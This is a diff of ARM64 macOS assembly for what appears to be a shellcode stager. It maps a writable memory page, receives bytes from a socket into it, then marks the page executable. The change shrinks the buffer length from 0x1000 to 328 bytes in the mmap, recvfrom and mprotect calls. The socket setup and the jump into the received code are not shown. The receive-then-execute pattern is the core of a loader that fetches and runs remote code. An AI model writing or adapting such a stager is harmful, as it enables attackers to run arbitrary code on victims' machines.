@@ -20,9 +20,9 @@
 
 .global _main
 _main:
-  /* mmap(addr=0, length=0x1000, prot=0x2 (PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=-1, offset=0) */
+  /* mmap(addr=0, length=328, prot=0x2 (PROT_WRITE), flags=0x1002 (MAP_PRIVATE | MAP_ANON), fd=-1, offset=0) */
   mov x0, xzr
-  mov x1, #0x1000
+  mov x1, #328
   mov x2, #2
   mov x3, #0x1002
   mvn x4, xzr
@@ -59,10 +59,10 @@ socket:
   svc 0
   //cbnz w0, retry
 
-  /* recvfrom(sockfd='x13', address='x12', length=0x1000, flags=0x40 (MSG_WAITALL), from=0, fromlenaddr=0) */
+  /* recvfrom(sockfd='x13', address='x12', length=328, flags=0x40 (MSG_WAITALL), from=0, fromlenaddr=0) */
   mov x0, x13
   mov x1, x12
-  mov x2, #0x1000
+  mov x2, #328
   mov x3, #0x40
   mov x4, xzr
   mov x5, xzr 
@@ -70,9 +70,9 @@ socket:
   svc 0
   //cbnz w0, retry
 
-  /* mprotect(addr, length=0x1000, prot=0x5 (PROT_READ | PROT_EXEC)) */
+  /* mprotect(addr, length=328, prot=0x5 (PROT_READ | PROT_EXEC)) */
   mov x0, x12
-  mov x1, #0x1000
+  mov x1, #328
   mov x2, #5
   ldr x16, =SYS_MPROTECT
   svc 0
